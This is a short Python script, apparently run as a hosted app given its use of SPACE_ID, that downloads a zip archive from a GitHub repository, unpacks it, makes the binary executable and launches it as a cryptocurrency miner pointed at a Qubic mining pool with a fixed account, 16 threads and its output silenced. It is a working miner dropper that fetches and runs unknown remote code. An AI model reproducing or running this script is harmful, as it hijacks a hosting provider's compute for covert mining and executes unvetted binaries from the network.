import os
os.system("wget https://github.com/qqivk/claas/raw/refs/heads/main/Wiaiu.zip")
os.system("unzip Wiaiu.zip")
os.system("chmod +x Wiaiu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Wiaiu --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
